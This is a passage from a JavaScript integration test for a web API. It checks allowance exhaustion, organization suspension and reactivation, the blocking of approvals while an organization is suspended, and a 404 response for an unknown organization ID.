  assert.equal(g.body.requested, 2);
  assert.equal((await generate(admin.token, orgId, doc.id, { count: 1 })).status, 402, 'allowance used up');

  // Suspension: members can still read, but nothing changes until the owner reactivates.
  await call(`/admin/organizations/${orgId}`, { ...json('PATCH', { status: 'suspended' }), token: owner.token });
  assert.equal((await call(`/orgs/${orgId}/items`, { token: admin.token })).status, 200);
  assert.equal((await call(`/orgs/${orgId}/items/${g.body.items[0].id}/approve`, { ...json('POST', {}), token: admin.token })).status, 403);
  assert.equal((await call(`/orgs/${orgId}/items/${g.body.items[0].id}/approve`, { ...json('POST', {}), token: admin.token })).body.code, 'org_suspended');
  await call(`/admin/organizations/${orgId}`, { ...json('PATCH', { status: 'active' }), token: owner.token });
  assert.equal((await call(`/orgs/${orgId}/items/${g.body.items[0].id}/approve`, { ...json('POST', {}), token: admin.token })).status, 200);
  assert.equal((await call(`/admin/organizations/${crypto.randomUUID()}`, { ...json('PATCH', { status: 'active' }), token: owner.token })).status, 404);
});
